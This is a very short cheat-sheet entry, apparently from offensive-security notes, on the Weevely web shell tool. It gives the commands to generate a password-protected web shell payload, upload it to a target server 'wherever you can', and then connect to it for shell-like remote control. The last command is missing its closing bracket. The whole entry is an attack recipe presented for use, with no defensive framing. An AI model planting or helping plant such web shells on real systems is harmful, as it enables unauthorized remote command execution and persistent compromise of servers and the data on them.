# WEB SHELL

## Weevely
```
# Weevely is insane ! 
# It's like enhanced webshell which looks like a real shell

# First, generate a payload shell
weevely generate <password> <filename>

# Then upload the file or copy the code wherever you can
# Then you can just call your shell
weevely <url> <password
```
